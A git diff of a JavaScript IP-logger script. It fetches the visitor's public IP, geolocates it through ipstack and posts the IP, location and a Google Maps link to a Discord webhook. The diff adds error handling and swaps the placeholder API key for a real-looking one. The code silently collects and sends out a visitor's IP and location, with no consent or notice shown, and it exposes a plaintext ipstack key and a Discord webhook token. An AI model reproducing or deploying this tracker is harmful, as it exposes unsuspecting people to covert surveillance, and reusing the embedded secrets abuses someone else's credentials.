@@ -1,6 +1,6 @@
 const ipifyAPI = "https://api.ipify.org?format=json";
 const ipstackAPI = "http://api.ipstack.com/";
-const apiKey = "YOUR_API_KEY"; // Replace with your ipstack API key
+const apiKey = "474d0f3cee0cdd0caf72f48191d95c17"; // Replace with your ipstack API key
 const webhookURL =
   "https://discord.com/api/webhooks/1367683410989940756/cx2uFFLodvi3paS-hUHxv9waFC4LG2FEqRGLs0bO8nV3CQ-qvPnp8NYbsmiMkMHRteA5";
 
@@ -22,6 +22,10 @@ async function getIP() {
   try {
     const response = await fetch(ipifyAPI);
     const data = await response.json();
+    if (!data.ip) {
+      console.error("No IP data received from ipify.");
+      return null;
+    }
     console.log("Fetched IP:", data.ip); // Log the fetched IP
     return data.ip;
   } catch (error) {
@@ -35,15 +39,11 @@ async function getGeolocation(ip) {
   try {
     const response = await fetch(`${ipstackAPI}${ip}?access_key=${apiKey}`);
     const data = await response.json();
-    console.log("Full Geolocation Data:", data); // Log full geolocation data for debugging
-
-    // Check if the response contains a valid status
     if (data.error) {
       console.error("Error fetching geolocation:", data.error.info);
       return null;
     }
-
-    // Return the location data only if available
+    console.log("Full Geolocation Data:", data); // Log full geolocation data for debugging
     return {
       city: data.city,
       region: data.region_name,
@@ -66,7 +66,6 @@ async function sendToDiscord(ip, location) {
 
   const timestamp = getGeorgianTime();
 
-  // Check if location is available
   const locationMessage = location
     ? `Location: ${location.city}, ${location.region}, ${location.country}\nMap: [Google Maps](https://www.google.com/maps?q=${location.lat},${location.lon})`
     : "Location: Could not fetch location or map.\nMap: N/A";
@@ -90,7 +89,7 @@ async function sendToDiscord(ip, location) {
       console.error("Error sending data to Discord:", response.statusText);
     }
   } catch (error) {
-    console.error("Error:", error); // This will catch any network or other errors.
+    console.error("Error sending data to Discord:", error);
   }
 }
 
